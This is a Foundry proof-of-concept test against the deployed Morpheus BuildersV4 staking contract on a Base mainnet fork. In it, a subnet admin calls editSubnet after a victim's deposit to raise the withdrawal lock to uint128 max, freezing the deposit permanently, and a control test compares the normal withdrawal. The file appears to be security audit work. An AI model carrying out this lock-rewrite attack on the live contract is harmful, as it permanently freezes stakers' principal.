// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

/// @notice Minimal ERC20 surface used by this PoC.
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

/// @notice Minimal BuildersV4 surface, matching the deployed implementation
///         (Sourcify exact match for impl 0x18faef315b40a6d9cf49628f1133b1aa507513b0).
interface IBuildersV4 {
    struct Subnet {
        string name;
        address admin;
        uint128 unusedStorage1_V4Update;
        uint128 withdrawLockPeriodAfterDeposit;
        uint128 unusedStorage2_V4Update;
        uint256 minimalDeposit;
        address claimAdmin;
    }

    struct SubnetMetadata {
        string slug;
        string description;
        string website;
        string image;
    }

    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external;
    function editSubnet(bytes32 subnetId_, Subnet calldata newSubnet_) external;
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function withdraw(bytes32 subnetId_, uint256 amount_) external;
    function getSubnetId(string memory subnetName_) external view returns (bytes32);
    function minimalWithdrawLockPeriod() external view returns (uint256);
    function subnetCreationFeeAmount() external view returns (uint256);
    function usersData(address user, bytes32 subnetId)
        external
        view
        returns (uint128 lastDeposit, uint128 unused1, uint256 deposited, uint256 unused2);
    function subnets(bytes32 subnetId)
        external
        view
        returns (
            string memory name,
            address admin,
            uint128 unused1,
            uint128 withdrawLockPeriodAfterDeposit,
            uint128 unused2,
            uint256 minimalDeposit,
            address claimAdmin
        );
}

/// @notice Helper so that forge-std `deal()` can be attempted inside a try/catch:
///         `deal` is an internal library-style call and cannot be try/caught directly.
contract DealHelper is Test {
    function tryDeal(address token, address to, uint256 amount) external {
        deal(token, to, amount);
    }
}

/// @title  Morpheus BuildersV4 C-1 PoC — post-deposit lock rewrite permanently locks staker principal
/// @notice Fork-only PoC against Base mainnet state. NEVER run against live mainnet.
///         Finding: BuildersV4.editSubnet lets a subnet admin raise
///         `withdrawLockPeriodAfterDeposit` AFTER users have deposited, with no upper
///         bound and no time gate. withdraw() checks the lock against the CURRENT
///         subnet storage value (not a per-user snapshot taken at deposit time), so
///         the edit retroactively extends every staker's lock — up to type(uint128).max
///         seconds, i.e. a permanent lock of principal (a lock, not a theft: the admin
///         cannot withdraw other users' deposits either).
contract PoC_C1_LockRewrite is Test {
    // --- Deployed addresses (Base mainnet) ---
    IBuildersV4 internal constant BUILDERS = IBuildersV4(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9);
    IERC20 internal constant MOR = IERC20(0x7431aDa8a591C955a994a21710752EF9b882b8e3);

    uint256 internal constant FORK_BLOCK = 58522987;
    uint256 internal constant DEPOSIT_AMOUNT = 10_000 ether; // 10,000 MOR (18 decimals)
    uint256 internal constant INITIAL_LOCK = 604800; // 7 days, the on-chain minimum

    string internal constant SUBNET_NAME = "poc-c1-lock-rewrite-9f27e1";

    address internal attackerAdmin = makeAddr("attackerAdmin");
    address internal victim = makeAddr("victim");

    string internal fundingMethod;

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_RPC_URL"), FORK_BLOCK);

        // Sanity: deployed parameters this PoC relies on.
        assertEq(BUILDERS.minimalWithdrawLockPeriod(), INITIAL_LOCK, "minimalWithdrawLockPeriod != 7 days");
        assertEq(BUILDERS.subnetCreationFeeAmount(), 0, "subnetCreationFeeAmount != 0");

        _fundVictim();
        assertEq(MOR.balanceOf(victim), DEPOSIT_AMOUNT, "victim funding failed");
    }

    /// @dev Try forge-std deal() first; fall back to impersonating the BuildersV4
    ///      proxy (which holds ~2.98M MOR of staker deposits) for a plain transfer.
    function _fundVictim() internal {
        DealHelper helper = new DealHelper();
        try helper.tryDeal(address(MOR), victim, DEPOSIT_AMOUNT) {
            if (MOR.balanceOf(victim) == DEPOSIT_AMOUNT) {
                fundingMethod = "deal()";
                return;
            }
        } catch {}
        // Fallback: prank the BuildersV4 proxy itself and transfer MOR out of it.
        vm.prank(address(BUILDERS));
        MOR.transfer(victim, DEPOSIT_AMOUNT);
        fundingMethod = "prank(BuildersV4 proxy) transfer";
    }

    function _createSubnet() internal returns (bytes32 subnetId) {
        IBuildersV4.Subnet memory subnet = IBuildersV4.Subnet({
            name: SUBNET_NAME,
            admin: attackerAdmin,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: uint128(INITIAL_LOCK),
            unusedStorage2_V4Update: 0,
            minimalDeposit: 0,
            claimAdmin: attackerAdmin
        });
        IBuildersV4.SubnetMetadata memory metadata =
            IBuildersV4.SubnetMetadata({slug: "", description: "", website: "", image: ""});

        vm.prank(attackerAdmin);
        BUILDERS.createSubnet(subnet, metadata);

        subnetId = BUILDERS.getSubnetId(SUBNET_NAME);
    }

    function _victimDeposit(bytes32 subnetId) internal returns (uint256 depositTime) {
        vm.startPrank(victim);
        MOR.approve(address(BUILDERS), DEPOSIT_AMOUNT);
        BUILDERS.deposit(subnetId, DEPOSIT_AMOUNT);
        vm.stopPrank();
        depositTime = block.timestamp;
    }

    function _recordedDeposit(address user, bytes32 subnetId) internal view returns (uint256 deposited) {
        (, , deposited, ) = BUILDERS.usersData(user, subnetId);
    }

    function _currentLock(bytes32 subnetId) internal view returns (uint128 lock) {
        (, , , lock, , , ) = BUILDERS.subnets(subnetId);
    }

    /// @notice Test 1 — the attack: admin rewrites the lock to uint128 max AFTER the
    ///         victim deposited under a 7-day lock. The victim can never withdraw.
    function test_01_attack_postDepositLockRewritePermanentlyLocksPrincipal() public {
        emit log_named_string("funding method", fundingMethod);
        bytes32 subnetId = _createSubnet();

        uint256 depositTime = _victimDeposit(subnetId);

        uint256 recorded = _recordedDeposit(victim, subnetId);
        emit log_named_uint("victim recorded deposit (MOR wei)", recorded);
        assertEq(recorded, DEPOSIT_AMOUNT, "recorded deposit mismatch");

        uint128 lockBefore = _currentLock(subnetId);
        emit log_named_uint("lock before edit (seconds)", uint256(lockBefore));
        assertEq(uint256(lockBefore), INITIAL_LOCK, "unexpected initial lock");

        uint256 victimBalanceAfterDeposit = MOR.balanceOf(victim);
        emit log_named_uint("victim MOR balance after deposit", victimBalanceAfterDeposit);

        // --- The attack: rewrite the lock retroactively, no upper bound, no time gate.
        IBuildersV4.Subnet memory hostile = IBuildersV4.Subnet({
            name: SUBNET_NAME,
            admin: attackerAdmin,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: type(uint128).max,
            unusedStorage2_V4Update: 0,
            minimalDeposit: 0,
            claimAdmin: attackerAdmin
        });
        vm.prank(attackerAdmin);
        BUILDERS.editSubnet(subnetId, hostile);

        uint128 lockAfter = _currentLock(subnetId);
        emit log_named_uint("lock after edit (seconds)", uint256(lockAfter));
        assertEq(lockAfter, type(uint128).max, "lock was not rewritten to uint128 max");

        // --- 8 days later: the original 7-day lock has long expired, yet withdraw reverts.
        vm.warp(depositTime + 8 days);
        vm.prank(victim);
        vm.expectRevert();
        BUILDERS.withdraw(subnetId, DEPOSIT_AMOUNT);

        // --- 100 years later: still reverts. The lock is effectively permanent.
        vm.warp(depositTime + 100 * 365 days);
        vm.prank(victim);
        vm.expectRevert();
        BUILDERS.withdraw(subnetId, DEPOSIT_AMOUNT);

        // --- Principal is locked, not stolen: still recorded, victim balance untouched.
        uint256 recordedAfter = _recordedDeposit(victim, subnetId);
        emit log_named_uint("victim recorded deposit after attack (MOR wei)", recordedAfter);
        assertEq(recordedAfter, DEPOSIT_AMOUNT, "principal should still be recorded (locked, not stolen)");
        assertEq(MOR.balanceOf(victim), victimBalanceAfterDeposit, "victim balance changed since deposit");
        emit log_named_uint("victim MOR balance at end (still locked out)", MOR.balanceOf(victim));
    }

    /// @notice Test 2 — control: identical setup WITHOUT the editSubnet step.
    ///         After the 7-day lock the victim withdraws in full.
    function test_02_control_noEditVictimWithdrawsAfterLock() public {
        emit log_named_string("funding method", fundingMethod);
        bytes32 subnetId = _createSubnet();

        uint256 depositTime = _victimDeposit(subnetId);
        assertEq(_recordedDeposit(victim, subnetId), DEPOSIT_AMOUNT, "recorded deposit mismatch");
        assertEq(uint256(_currentLock(subnetId)), INITIAL_LOCK, "unexpected initial lock");

        vm.warp(depositTime + 8 days);

        vm.prank(victim);
        BUILDERS.withdraw(subnetId, DEPOSIT_AMOUNT);

        uint256 victimBalance = MOR.balanceOf(victim);
        emit log_named_uint("victim MOR balance after control withdraw", victimBalance);
        assertEq(victimBalance, DEPOSIT_AMOUNT, "victim did not recover the full deposit");
        assertEq(_recordedDeposit(victim, subnetId), 0, "recorded deposit should be zero after withdraw");
    }
}
